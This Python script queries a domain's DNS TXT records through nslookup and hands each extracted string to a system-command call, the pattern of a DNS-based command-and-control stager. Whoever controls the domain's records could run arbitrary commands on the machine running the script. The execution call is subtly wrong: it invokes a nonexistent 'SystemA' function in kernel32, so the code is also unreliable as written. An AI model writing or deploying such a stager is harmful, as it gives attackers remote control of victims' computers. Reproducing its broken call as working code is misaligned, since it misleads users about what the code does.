import subprocess
import re
import ctypes

def query_txt_records(domain):
    try:
        # Run nslookup command to query TXT records for the domain
        result = subprocess.run(["nslookup", "-type=TXT", domain], capture_output=True, text=True)

        # Check if the command executed successfully
        if result.returncode == 0:
            # Extract strings after "text = " using regex
            txt_records = re.findall(r'text = "(.*)"', result.stdout)

            if txt_records:
                print("TXT records for", domain)
                for record in txt_records:
                    print(record)
                    # Execute system-level command using the extracted string
                    ctypes.windll.kernel32.SystemA(record)
            else:
                print(f"No TXT records found for {domain}")
        else:
            print(f"Error executing nslookup command: {result.stderr}")
            
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    domain = "example.com"
    query_txt_records(domain)

if __name__ == "__main__":
    main()
